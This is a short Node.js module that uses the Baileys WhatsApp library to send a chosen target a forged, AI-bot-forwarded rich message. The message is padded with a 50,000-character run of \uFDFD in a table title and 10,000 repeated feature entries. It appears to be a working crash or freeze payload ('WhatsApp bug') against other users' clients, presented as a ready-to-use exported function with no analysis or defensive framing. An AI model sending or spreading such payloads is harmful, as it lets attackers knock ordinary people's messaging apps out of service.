
const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');


async function Xgc(SYxS7, target) {
    try {
        const r = (str, n) => str.repeat(n);

        const msg = {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 1,
                        submessages: [
                            { 
                                messageType: 2, 
                                messageText: "@" + target.split('@')[0]
                            },
                            { 
                                messageType: 3, 
                                mediaMetadata: {} 
                            },
                            {
                                messageType: 4,
                                tableMetadata: {
                                    title: "\u0000" + r("\uFDFD", 50000),
                                    rows: [{ 
                                        items: [], 
                                        isHeading: true 
                                    }]
                                }
                            }
                        ],
                        contextInfo: {
                            mentionedJid: [target],
                            featureEligibilities: Array.from({ length: 10000 }, function() { 
                                return { canReceiveMultiReact: true };
                            }),
                            isForwarded: true,
                            forwardedAiBotMessageInfo: { 
                                botJid: "867051314767696@bot" 
                            },
                            forwardOrigin: 4
                        }
                    }
                }
            }
        };

        await SYxS7.relayMessage(target, msg, {});
    } catch (err) { 
        console.error("Error:", err); 
    }
}


module.exports = { Xgc };
